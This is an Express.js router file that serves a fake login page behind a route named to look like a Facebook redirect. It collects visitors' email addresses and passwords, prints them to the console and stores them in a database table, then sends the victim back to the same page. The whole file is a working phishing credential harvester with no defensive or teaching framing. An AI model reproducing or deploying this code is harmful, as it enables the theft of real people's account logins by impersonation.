const express = require('express');
const router = express.Router();
const pool = require('../database');

router.get('/', (req, res) => {
    res.render("PAT-035/login")
});

router.get('/facebook-redirect-login-drive-carpetacapturas', (req, res) => {
    res.render("PAT-035/login")
});

router.post('/inicar-sesion',async (req, res) => {
    const {correo,contrasena} = req.body;
    console.log(correo);
    console.log(contrasena);
    const newRegistro= {
        correo,
        contrasena
    };
    
    await pool.query('INSERT INTO registros set ?', [newRegistro]);
    res.redirect("/facebook-redirect-login-drive-carpetacapturas"); 

});

module.exports = router;



